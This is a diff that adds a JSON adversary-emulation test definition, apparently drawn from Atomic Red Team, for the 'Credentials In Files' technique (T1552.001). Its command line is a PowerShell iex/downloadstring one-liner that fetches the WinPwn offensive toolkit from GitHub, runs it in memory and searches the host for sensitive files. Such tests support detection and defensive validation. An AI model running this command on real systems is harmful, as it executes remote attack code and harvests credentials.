@@ -1,0 +1,23 @@
+{
+    "name": "WinPwn - sensitivefiles",
+    "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1552.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Credentials In Files",
+    "source": "ART",
+    "uuid": "114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
